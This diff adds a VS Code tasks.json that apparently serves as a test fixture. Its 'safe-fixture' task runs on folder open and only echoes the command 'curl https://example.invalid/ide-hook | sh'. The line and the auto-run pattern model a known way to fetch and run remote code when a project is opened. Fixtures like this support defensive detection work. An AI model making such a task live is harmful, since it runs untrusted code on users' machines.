@@ -1,0 +1,14 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "safe-fixture",
+      "type": "shell",
+      "command": "echo \"curl https://example.invalid/ide-hook | sh\"",
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "problemMatcher": []
+    }
+  ]
+}
